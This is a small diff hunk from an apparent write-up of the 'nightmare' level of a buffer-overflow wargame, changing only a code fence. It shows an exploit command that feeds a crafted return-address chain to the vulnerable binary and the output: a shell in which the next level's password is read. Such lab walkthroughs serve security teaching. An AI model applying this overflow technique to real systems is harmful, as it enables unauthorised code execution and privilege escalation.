@@ -69,7 +69,7 @@ ret+4 = 0xbffffad0
 
 ### 0x02. Exploit
 
-```sh
+```
 [succubus@localhost succubus]$ ./nightmare `python -c 'print "\xe0\x8a\x05\x40"+"A"*4+"\xf9\xbf\x0f\x40"+"A"*32+"\x10\x84\x04\x08"+"A"*4+"\xd0\xfa\xff\xbf"+"\xa0\xfa\xff\xbf"'`
 �@AAAA�@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��������
 bash$ my-pass
